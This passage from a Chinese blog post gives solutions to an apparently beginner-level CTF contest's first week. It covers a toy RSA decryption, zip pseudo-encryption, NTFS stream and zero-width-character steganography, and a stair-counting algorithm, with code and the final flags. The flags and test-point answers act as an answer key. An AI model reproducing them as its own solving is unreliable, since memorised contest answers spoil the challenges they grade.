+<p>也有很多学弟学妹们用的是逆元的定义：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10009</mn><mi>d</mi><mo>=</mo><mn>1</mn><mo>+</mo><mi>k</mi><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">10009d= 1 +k \phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">9</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">ϕ</span></span></span></span> 做出来的，通过枚举<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，找到了<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span></span></span></span> 的值。。不过这一方法在下一个 RSA 中就不太适用了，因为下一题的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 很大，没法枚举了。</p>
+<h3 id="blackgiversa"><a class="markdownIt-Anchor" href="#blackgiversa">#</a> BlackGiveRSA</h3>
+<p>一个 RSA 题目，看到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span> 比较小，那么<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span> 的值直接放入网站 /yafu/sagemath 中分解就行了。<br>
+分解出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mn>1175078221</mn><mo separator="true">,</mo><mi>q</mi><mo>=</mo><mn>1435756429</mn></mrow><annotation encoding="application/x-tex">p=1175078221,q=1435756429</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">7</span><span class="mord">5</span><span class="mord">0</span><span class="mord">7</span><span class="mord">8</span><span class="mord">2</span><span class="mord">2</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">4</span><span class="mord">3</span><span class="mord">5</span><span class="mord">7</span><span class="mord">5</span><span class="mord">6</span><span class="mord">4</span><span class="mord">2</span><span class="mord">9</span></span></span></span>。然后对输出内容一段一段解密，再 <code>long_to_bytes</code>  连接起来，就是 flag 了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p,q=<span class="number">1175078221</span>,<span class="number">1435756429</span></span><br><span class="line">n,phi=p*q,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse(<span class="number">10007</span>,phi)</span><br><span class="line">cipher=[</span><br><span class="line">    <span class="number">1150947306854980854</span>,</span><br><span class="line">    <span class="number">243703926267532432</span>,</span><br><span class="line">    <span class="number">1069319314811079682</span>,</span><br><span class="line">    <span class="number">688582941857504686</span>,</span><br><span class="line">    <span class="number">670683629344243145</span>,</span><br><span class="line">    <span class="number">1195068175327355214</span></span><br><span class="line">    ]</span><br><span class="line">m=<span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">    m+=long_to_bytes(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#0xGame&#123;ChuTiRenDeQQShiJiShangJiuShiQDeZhi&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>flag 解出来：“出题人的 QQ 实际上就是 q 的值。”，各位学弟学妹们可以看看自己 QQ 是不是素数，平均 30 几个 QQ 号就有一个是素数。</p>
+<h2 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> Misc</h2>
+<h3 id="sign-in"><a class="markdownIt-Anchor" href="#sign-in">#</a> Sign in</h3>
+<p>直接看 RULES 就行</p>
+<h3 id="a-translate-draft"><a class="markdownIt-Anchor" href="#a-translate-draft">#</a> A translate draft</h3>
+<p>下载附件，打开提示需要输入密码，是伪加密。扔进 winhex，搜索 504B0102，往后看加密位置，是 0900，更改为 0000。打开文件，将 word 文档解压出来，打开，下拉到最下方，有一段空白，全选更改字体颜色为红色可以看到 b32 加密的串，解出前半段 flag。将 word 改为 zip，打开发现 HiddenBy13.txt，内容为 rot13 加密的后半段 flag。</p>
+<h3 id="认真的血"><a class="markdownIt-Anchor" href="#认真的血">#</a> 认真的血</h3>
+<p>NTFS 文件流隐写，使用 winrar 解压文件，使用 ntfsstreameditor 扫描得到 flag.txt，内容为 ROT47 加密，解密得 flag。</p>
+<h3 id="kakurennbo"><a class="markdownIt-Anchor" href="#kakurennbo">#</a> Kakurennbo</h3>
+<p>光标在文本内停留，按→键会发现有明显的阻滞感。这显然是 0 宽隐写。验证：在 kali 下使用 vim 打开文本，可以发现 0 宽字符。在线解密 http://330k.github.io/misc_tools/unicode_steganography.html</p>
+<p>可以得到 W 型栅栏加密过的 flag。<a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=777%E8%A7%A3%E5%AF%86%EF%BC%8C%E6%A0%8F%E6%95%B021%E5%BE%97%E5%88%B0flag%E3%80%82">http://www.atoolbox.net/Tool.php?Id=777 解密，栏数 21 得到 flag。</a></p>
+<h3 id="ezalgorithm"><a class="markdownIt-Anchor" href="#ezalgorithm">#</a> EzAlgorithm</h3>
+<p>一个简单的算法题：因为第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span> 级楼梯可以通过第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>i</mi><mo>−</mo><mn>2</mn><mo separator="true">,</mo><mi>i</mi><mo>−</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">i-1,i-2,i-3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span> 级楼梯到达，因此到达第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span> 级楼梯的走法等于到达第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">i-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> 级楼梯的走法加上到达第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>−</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">i-2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 级楼梯的走法加上到达第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>−</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">i-3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span> 级楼梯的走法。</p>
+<p>不过在这之前，我们要判断一下楼梯有没有坏掉。如果楼梯坏掉了，那么我们就直接把到达那一级楼梯的方法数记为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span> 就行。</p>
+<p>这边需要注意的是，由于模数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1435756429</mn></mrow><annotation encoding="application/x-tex">1435756429</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">4</span><span class="mord">3</span><span class="mord">5</span><span class="mord">7</span><span class="mord">5</span><span class="mord">6</span><span class="mord">4</span><span class="mord">2</span><span class="mord">9</span></span></span></span> 比 <code>C/C++ int</code>  的最大值的一半要大，那这里需要开 <code>long long</code>  解决。</p>
+<p>这是解题代码（C 语言的，C++/Python 也可以做。），最后是十个测试点的答案。需要注意的是有一个点有点坑，因为那个点它第一级楼梯就是坏的：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> f[<span class="number">4000000</span>]=&#123;<span class="number">0</span>&#125;,v[<span class="number">4000000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FILE *fp=fopen(<span class="string">&quot;testdata10.in&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="comment">//这边的数字从1到10挨个修改，运行一遍就行</span></span><br><span class="line">	FILE *gp=fopen(<span class="string">&quot;result.out&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;k);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=k;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> x;</span><br><span class="line">		<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">		v[x]=<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!v[<span class="number">1</span>]) f[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(!v[<span class="number">2</span>]) f[<span class="number">2</span>]=f[<span class="number">1</span>]+<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(!v[<span class="number">3</span>]) f[<span class="number">3</span>]=f[<span class="number">1</span>]+f[<span class="number">2</span>]+<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">4</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(v[i]==<span class="number">1</span>)</span><br><span class="line">			f[i]=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			f[i]=(f[i<span class="number">-1</span>]+f[i<span class="number">-2</span>]+f[i<span class="number">-3</span>])%<span class="number">1435756429</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">fprintf</span>(gp,<span class="string">&quot;%lld\n&quot;</span>,f[n]%<span class="number">1435756429</span>);</span><br><span class="line">	fclose(fp);</span><br><span class="line">	fclose(gp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//13 98 47 3359124 1205125 834118675 1289432148 1087983205 1176572515 566575482</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这些数加起来模<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1435756429</mn></mrow><annotation encoding="application/x-tex">1435756429</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">4</span><span class="mord">3</span><span class="mord">5</span><span class="mord">7</span><span class="mord">5</span><span class="mord">6</span><span class="mord">4</span><span class="mord">2</span><span class="mord">9</span></span></span></span> 的值为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>651977145</mn></mrow><annotation encoding="application/x-tex">651977145</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mord">5</span><span class="mord">1</span><span class="mord">9</span><span class="mord">7</span><span class="mord">7</span><span class="mord">1</span><span class="mord">4</span><span class="mord">5</span></span></span></span>，所以 flag 为 <code>0xGame&#123;651977145&#125;</code> 。</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">十二惊惶</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://shierjinghuang.github.io/Nctf%E8%BF%8E%E6%96%B0%E8%B5%9B%E7%AC%AC%E4%B8%80%E5%91%A8/20211011/">https://shierjinghuang.github.io/Nctf%E8%BF%8E%E6%96%B0%E8%B5%9B%E7%AC%AC%E4%B8%80%E5%91%A8/20211011/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">十二惊惶</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/">
+                                    <span class="chip bg-color">解题记录</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%E9%9A%8F%E4%BE%BF%E6%B3%A8wp/20211015/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="强网杯-2019随便注wp">
+                        
+                        <span class="card-title">强网杯-2019随便注wp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-15
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            十二惊惶
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E9%A2%98%E8%AE%B0%E5%BD%95/">
+                        <span class="chip bg-color">web题记录</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/Buu%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bmisc-%E4%BA%8C/20211009/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="Buu解题记录之misc(二)">
+                        
+                        <span class="card-title">Buu解题记录之misc(二)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-09
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Misc/">
+                        <span class="chip bg-color">Misc</span>
+                    </a>
+                    
+                    <a href="/tags/%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/">
+                        <span class="chip bg-color">解题记录</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2023</span>
+            
+            <a href="/about" target="_blank">十二惊惶</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">318.8k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:572688347@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=572688347" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 572688347" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
